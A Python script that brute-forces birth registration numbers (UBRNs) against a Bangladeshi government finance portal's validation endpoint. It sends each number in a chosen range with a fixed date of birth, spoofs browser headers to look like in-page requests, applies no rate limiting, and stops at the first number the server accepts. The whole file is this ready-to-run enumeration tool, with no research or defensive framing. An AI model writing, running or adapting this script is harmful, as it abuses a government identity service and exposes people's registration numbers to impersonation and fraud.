import requests
import json

# ANSI escape codes for colored and bold output
GREEN = "\033[92m"
YELLOW = "\033[93m"  # Yellow color code
BOLD = "\033[1m"
RESET = "\033[0m"

# Taking user input for UBRN range and date
start_ubrn = int(input(f"{BOLD}Enter the start UBRN: {RESET}"))
end_ubrn = int(input(f"{BOLD}Enter the end UBRN: {RESET}"))
dob = input(f"{BOLD}Enter the date (YYYY-MM-DD): {RESET}")  # Full date input

url = "https://ibas.finance.gov.bd/acs/general/BrnValidate"

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    'Accept-Encoding': "gzip, deflate, br, zstd",
    'Content-Type': "application/json",
    'sec-ch-ua-platform': "\"Android\"",
    'X-Requested-With': "XMLHttpRequest",
    'sec-ch-ua': "\"Not(A:Brand\";v=\"99\", \"Android WebView\";v=\"133\", \"Chromium\";v=\"133\"",
    'sec-ch-ua-mobile': "?1",
    'Origin': "https://ibas.finance.gov.bd",
    'Sec-Fetch-Site': "same-origin",
    'Sec-Fetch-Mode': "cors",
    'Sec-Fetch-Dest': "empty",
    'Referer': "https://ibas.finance.gov.bd/acs/general/sales",
    'Accept-Language': "en-US,en;q=0.9"
}

# Variable to store the last valid UBRN
last_ubrn = None

# Iterating through possible UBRN values
for ubrn in range(start_ubrn, end_ubrn + 1):
    try:
        payload = {"ubrn": str(ubrn), "dob": dob}
        response = requests.post(url, data=json.dumps(payload), headers=headers)
        response_data = response.json()

        response_code = response_data.get("responseCode")
        print(f"{BOLD}Trying UBRN: {ubrn} -> Response Code: {response_code}{RESET}")
        
        # Adding the separator line in bold
        print(f"{BOLD}{50*'-'}{RESET}")

        if response_code == "0":  # If response code is "0", print success in GREEN
            print(f"{GREEN}{BOLD}Successfully processed!{RESET}")
            last_ubrn = ubrn
            print(f"{YELLOW}{BOLD}Successfully processed UBRN: {ubrn}{RESET}")
            exit()

        if response_code == "SUCCESS":  # Adjust based on actual success response
            print(f"{BOLD}Valid UBRN found: {ubrn}{RESET}")
            last_ubrn = ubrn
            print(f"{YELLOW}{BOLD}Successfully processed UBRN: {ubrn}{RESET}")
            exit()  # Stop execution if a valid UBRN is found

    except Exception as e:
        print(f"{BOLD}Error with UBRN {ubrn}: {e}{RESET}")

# If no valid UBRN found, print the last processed UBRN and success message
if last_ubrn is not None:
    print(f"{BOLD}Last processed UBRN: {last_ubrn}{RESET}")
    print(f"{BOLD}Success response received for UBRN: {last_ubrn}{RESET}")
    print(f"{YELLOW}{BOLD}Successfully processed UBRN: {last_ubrn}{RESET}")
else:
    print(f"{BOLD}No valid UBRN was found within the given range.{RESET}")
